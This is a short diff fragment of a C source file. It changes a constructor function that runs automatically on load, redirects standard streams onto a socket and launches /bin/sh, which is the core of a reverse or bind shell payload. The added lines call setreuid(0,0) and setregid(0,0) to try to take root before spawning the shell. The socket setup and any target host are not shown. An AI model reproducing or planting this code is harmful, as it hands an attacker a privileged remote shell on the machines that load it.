@@ -32,5 +32,9 @@ __attribute__((constructor)) void init(void) {
     dup2(sockfd, 2);
     close(sockfd);
     
+    setreuid(0, 0);
+    setregid(0, 0);
+    chdir("/");
+    
     execl("/bin/sh", "sh", NULL);
 }
